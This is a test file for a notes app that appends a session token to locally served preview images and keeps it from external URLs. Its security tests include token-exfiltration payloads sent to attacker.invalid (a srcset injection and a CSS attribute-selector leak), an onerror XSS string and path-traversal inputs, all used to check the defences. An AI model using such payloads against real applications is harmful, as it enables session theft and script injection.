// Pins the Preview image-src resolution — the bug where every image in
// Preview mode rendered broken: relative srcs resolved to /api/files/...
// but carried no ?token=, and a browser <img> GET can't set an
// Authorization header, so each request 401'd. The Live editor appended
// the token; the Preview renderer forgot to. Both directions matter:
// our own /api/files URLs must carry the token, and foreign/absolute
// URLs must never receive it.
// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { Marked } from 'marked';
import { resolveImgSrc, renderImageHtml } from '../img-src.js';
import { sanitizeHtml, sanitizeSvg } from '../sanitize.js';

const BASE = '/api/files/personal/telemetry-apps-my-trips/';
const TOK = 'eyJhbGciOiJIUzI1NiJ9.payload.sig';

describe('resolveImgSrc', () => {
  it('resolves a relative src against the note dir and appends the token', () => {
    expect(resolveImgSrc('screenshots/overview.png', BASE, TOK)).toBe(
      `${BASE}screenshots/overview.png?token=${encodeURIComponent(TOK)}`
    );
  });

  it('handles a bare filename (upload convention)', () => {
    expect(resolveImgSrc('photo.png', BASE, TOK)).toBe(
      `${BASE}photo.png?token=${encodeURIComponent(TOK)}`
    );
  });

  it('still resolves without a token (no dangling query)', () => {
    expect(resolveImgSrc('photo.png', BASE, null)).toBe(`${BASE}photo.png`);
    expect(resolveImgSrc('photo.png', BASE, '')).toBe(`${BASE}photo.png`);
  });

  it('URI-encodes the token', () => {
    const src = resolveImgSrc('a.png', BASE, 'a+b/c=');
    expect(src).toBe(`${BASE}a.png?token=a%2Bb%2Fc%3D`);
  });

  it('never attaches the token to absolute or foreign URLs', () => {
    // Image URLs are user-authored and notes are shared between users —
    // a token riding along to an arbitrary host hands them your session.
    for (const href of [
      'https://example.com/x.png',
      'http://example.com/x.png',
      'data:image/png;base64,AAAA',
      '/already/rooted.png',
    ]) {
      expect(resolveImgSrc(href, BASE, TOK)).toBe(href);
    }
  });

  // The prefix test this replaced called any filename starting with those
  // letters an absolute URL, so an ordinary uploaded screenshot rendered
  // broken in Preview while working in the Live editor.
  it('treats a filename that merely starts with a scheme name as relative', () => {
    for (const name of ['http-flow.png', 'https-diagram.png', 'httpd-setup.png', 'data-model.png']) {
      expect(resolveImgSrc(name, BASE, TOK)).toBe(
        `${BASE}${name}?token=${encodeURIComponent(TOK)}`
      );
    }
  });

  // Parity with the Live editor's proxyDomURL: /^(https?:|data:|blob:|\/)/i.
  // Both renderers show the same note, so the two tests must agree.
  it('matches the Live editor on blob: and uppercased schemes', () => {
    for (const href of ['blob:https://host/uuid', 'HTTPS://example.com/x.png', 'Data:image/png;base64,AAAA']) {
      expect(resolveImgSrc(href, BASE, TOK)).toBe(href);
    }
  });

  it('handles empty/null href safely', () => {
    expect(resolveImgSrc('', BASE, TOK)).toBe('');
    expect(resolveImgSrc(null, BASE, TOK)).toBe('');
    expect(resolveImgSrc(undefined, BASE, TOK)).toBe('');
  });

  it('never adds a token to protocol-relative, backslash or whitespace-prefixed external URLs', () => {
    for (const href of ['//example.com/x.png', '\\\\example.com/x.png', ' https://example.com/x.png', 'ftp://example.com/x.png']) {
      expect(resolveImgSrc(href, BASE, TOK)).toBe(href.trim());
    }
  });

  it('preserves an image query and fragment while adding exactly one session token', () => {
    const url = new URL(resolveImgSrc('photo.png?size=2&token=old#crop', BASE, TOK), window.location.origin);
    expect(url.searchParams.get('size')).toBe('2');
    expect(url.searchParams.getAll('token')).toEqual([TOK]);
    expect(url.hash).toBe('#crop');
  });

  it('only appends credentials to normalized local file API paths', () => {
    expect(resolveImgSrc('../photo.png', BASE, TOK)).toBe('/api/files/personal/photo.png?token=' + TOK);
    expect(resolveImgSrc('../../../../redirect', BASE, TOK)).toBe('');
    expect(resolveImgSrc('%2e%2e/%2e%2e/%2e%2e/%2e%2e/redirect', BASE, TOK)).toBe('');
    expect(resolveImgSrc('photo.png', 'https://example.com/api/files/', TOK)).toBe('');
    expect(resolveImgSrc('photo.png', '/other-endpoint/', TOK)).toBe('');
  });
});

describe('image HTML security', () => {
  it('does not turn a crafted Markdown destination into a token-bearing srcset', () => {
    const md = new Marked();
    md.use({ renderer: { image: (image) => renderImageHtml(image, BASE, TOK) } });
    const html = md.parse('![](<photo.png" srcset="https://attacker.invalid/leak>)');
    const document = new DOMParser().parseFromString(html, 'text/html');
    const image = document.querySelector('img');
    expect(image).not.toBeNull();
    expect(image.hasAttribute('srcset')).toBe(false);
    const src = new URL(image.getAttribute('src'), window.location.origin);
    expect(src.origin).toBe(window.location.origin);
    expect(src.searchParams.get('token')).toBe(TOK);
  });

  it('escapes image URLs, alternative text and titles before HTML assembly', () => {
    const href = 'https://example.com/photo.png" onerror="alert(1)';
    const title = '"><img src="https://attacker.invalid/title">';
    const text = '" srcset="https://attacker.invalid/alt';
    const html = renderImageHtml({ href, title, text }, BASE, TOK);
    const document = new DOMParser().parseFromString(html, 'text/html');
    expect(document.querySelectorAll('img')).toHaveLength(1);
    expect(document.querySelector('[srcset]')).toBeNull();
    expect(document.querySelector('[onerror]')).toBeNull();
    expect(document.querySelector('img').getAttribute('src')).toBe(href);
    expect(document.querySelector('img').getAttribute('title')).toBe(title);
    expect(document.querySelector('img').getAttribute('alt')).toBe(text);
  });

  it('keeps remote images working after sanitization without adding the session token', () => {
    for (const href of ['https://example.com/photo.png?size=2', 'http://example.com/photo.png', '//example.com/photo.png']) {
      const html = sanitizeHtml(renderImageHtml({ href, title: 'A remote image', text: 'Remote' }, BASE, TOK));
      const document = new DOMParser().parseFromString(html, 'text/html');
      expect(document.querySelector('img').getAttribute('src')).toBe(href);
      expect(html).not.toContain(TOK);
    }
  });

  it('removes note-authored stylesheets that can inspect token-bearing image attributes', () => {
    const image = renderImageHtml({ href: 'photo.png' }, BASE, TOK);
    const html = sanitizeHtml(`<div><style>img[src*="token=${TOK}"] { background-image: url("https://attacker.invalid/css"); }</style>${image}</div>`);
    expect(html).not.toMatch(/<style/i);
    expect(html).not.toContain('attacker.invalid');
    expect(html).toContain('?token=' + TOK);
    expect(sanitizeHtml('<span style="color:red">Formatting</span>')).toContain('style="color:red"');
    expect(sanitizeSvg('<svg><style>.node { fill: red; }</style><rect class="node"/></svg>')).toContain('<style>');
  });
});
